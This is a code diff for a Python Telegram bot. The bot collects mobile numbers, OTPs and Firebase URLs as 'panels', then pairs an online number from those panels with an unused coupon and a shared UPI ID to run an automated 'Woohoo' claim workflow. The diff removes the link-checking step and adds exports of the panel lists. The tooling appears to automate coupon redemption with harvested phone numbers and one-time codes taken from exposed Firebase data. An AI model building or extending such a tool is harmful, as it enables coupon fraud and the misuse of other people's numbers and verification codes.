+    if not has_saved_panels and not urls_found and not numbers and not otps:
         output_blocks.append(
             "⚠️ **No Data Found:** No valid mobile numbers, OTPs, or Firebase URLs were detected."
         )
@@ -2405,7 +2536,7 @@ async def process_text_data_for_bot(
     if current_msg:
         messages.append(current_msg)
 
-    return messages, has_active
+    return messages, has_saved_panels
 
 
 # ==========================================
@@ -3345,71 +3476,13 @@ async def _run_firebase_scan_with_live_logs(
     context: ContextTypes.DEFAULT_TYPE,
     is_from_file: bool,
 ) -> tuple[list[str], bool]:
-    """
-    Runs Firebase URL checking while maintaining a separate live progress message
-    below the checking header, then transitions to the next step once finished.
-    """
-    status_msg = await message_target.reply_text(
-        "⏳ **Scanning links and checking Firebase status... Please wait.**",
-        parse_mode=ParseMode.MARKDOWN,
+    """Saves submitted Firebase links directly into the session without upfront checking."""
+    return await process_text_data_for_bot(
+        raw_text,
+        context=context,
+        is_from_file=is_from_file,
+        link_progress_callback=None,
     )
-    live_scan_msg = await message_target.reply_text(
-        "🔄 Checking databases: 0 checked | Currently running...",
-        reply_markup=get_cancel_to_claim_keyboard(),
-        parse_mode=None,
-    )
-
-    checked_lines: list[str] = []
-    last_live_text = live_scan_msg.text or ""
-    last_edit_time = 0.0
-
-    async def _on_link_checked(done_count: int, total_count: int, item_res: dict):
-        nonlocal last_live_text, last_edit_time
-        ep_short = _sanitize_plain_log_text(item_res.get("firebase_endpoint", ""))
-        st_short = _sanitize_plain_log_text(item_res.get("status", ""))
-        checked_lines.append(f"[{done_count}/{total_count}] {ep_short} -> {st_short}")
-
-        now_ts = time.monotonic()
-        if done_count < total_count and (done_count % 5 != 0) and (now_ts - last_edit_time < 1.5):
-            return
-
-        live_body = (
-            f"🔄 Databases checked: {done_count}/{total_count} | Running...\n"
-            + "\n".join(checked_lines[-15:])
-        )
-        if len(live_body) > 3800:
-            live_body = live_body[:3790] + "\n..."
-        if live_body != last_live_text:
-            last_live_text = live_body
-            last_edit_time = now_ts
-            try:
-                await live_scan_msg.edit_text(
-                    live_body,
-                    reply_markup=get_cancel_to_claim_keyboard(),
-                    parse_mode=None,
-                    disable_web_page_preview=True,
-                )
-            except Exception:
-                pass
-
-    try:
-        reply_chunks, has_active = await process_text_data_for_bot(
-            raw_text,
-            context=context,
-            is_from_file=is_from_file,
-            link_progress_callback=_on_link_checked,
-        )
-    finally:
-        try:
-            await live_scan_msg.delete()
-        except Exception:
-            pass
-        try:
-            await status_msg.delete()
-        except Exception:
-            pass
-
-    return reply_chunks, has_active
 
 
 async def receive_firebase_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -3695,7 +3768,7 @@ def _format_live_logs_message(status_line: str, failed_logs: list[str]) -> str:
 
 async def send_firebase_assigned_triplet(message_target, context: ContextTypes.DEFAULT_TYPE) -> int:
     """
-    Pairs an Online Number from Active Firebase panels with 1 unused coupon and
+    Pairs an Online Number from saved Firebase panels with 1 unused coupon and
     the 8-use UPI ID, runs the automated Woohoo claim workflow, and sends the A-to-Z log.
     """
     chat_id = message_target.chat.id if getattr(message_target, "chat", None) else 0
@@ -3715,6 +3788,7 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
     remaining_coupons = [c for c in all_coupons if c not in used_coupons]
 
     if not remaining_coupons:
+        await _send_active_panels_txt_file(message_target, context)
         await message_target.reply_text(FINAL_PNL_BATCH_COMPLETE_TEXT)
         return ConversationHandler.END
 
@@ -3722,7 +3796,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
     locked_coupon = coupon_info["coupon"]
     saved_upi_id = upi_cfg["upi_id"]
 
-    # 1. Start message (kept clean and separate from live log edits)
     await message_target.reply_text(
         f"⏳ **Auto-Claim Process Started...**\n"
         f"🎟️ **Coupon Code :** `{locked_coupon}` *(Locked until claimed)*\n"
@@ -3732,7 +3805,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
         disable_web_page_preview=True,
     )
 
-    # 2. Separate live logs message with Cancel button below it
     initial_live_text = _format_live_logs_message(
         status_line="Scanning active online numbers...",
         failed_logs=[],
@@ -3785,6 +3857,7 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
     if not claim_result.get("success"):
         if claim_result.get("reason") != "COUPON_INVALID":
             release_unredeemed_firebase_coupon(context, locked_coupon)
+            await _send_active_panels_txt_file(message_target, context)
             await _send_safe_long_text(
                 message_target,
                 f"⚠️ **Auto-Claim Incomplete (Coupon `{locked_coupon}` has been safely preserved):**\n"
@@ -3858,6 +3931,7 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
             parse_mode=ParseMode.MARKDOWN,
             disable_web_page_preview=True,
         )
+        await _send_active_panels_txt_file(message_target, context)
         await message_target.reply_text(FINAL_PNL_BATCH_COMPLETE_TEXT)
         return ConversationHandler.END
 
